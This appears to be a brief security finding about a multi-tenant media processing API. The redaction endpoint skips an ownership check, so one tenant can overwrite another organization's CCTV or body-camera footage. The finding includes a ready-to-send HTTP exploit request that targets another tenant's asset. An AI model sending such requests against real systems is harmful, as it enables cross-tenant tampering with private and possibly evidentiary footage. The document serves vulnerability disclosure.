diagnosis: The endpoint accepts mediaAssetId from the request body and runs facial redaction across a Piscina worker thread pool without verifying whether the asset belongs to req.session.organizationId. Any authenticated tenant can mutate and overwrite private CCTV or body-worn camera footage belonging to other organizations.
exploit_request:
POST /api/media/redact HTTP/1.1
Host: cctv-processing.security.io
Authorization: Bearer <tenant_b_session>
Content-Type: application/json

{"mediaAssetId": "asset_cctv_tenant_a_cam04", "blurRadius": 50}
